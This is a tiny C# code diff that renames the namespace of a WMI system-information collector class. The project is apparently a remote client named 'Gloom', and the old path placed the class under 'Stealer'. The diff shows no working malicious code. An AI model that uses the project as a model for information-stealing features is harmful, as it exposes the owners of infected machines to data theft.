@@ -1,6 +1,6 @@
 ﻿using Gloom.WmiOps;
 
-namespace Gloom.Client.Features.Stealer.InfoCollector.Wmi;
+namespace Gloom.Client.Features.InfoCollector.Wmi;
 public class WmiInfoCollector : FeatureBase
 {
 	public override Guid[] AcceptedOps => new Guid[] { OpCodes.WmiInfoRequest };
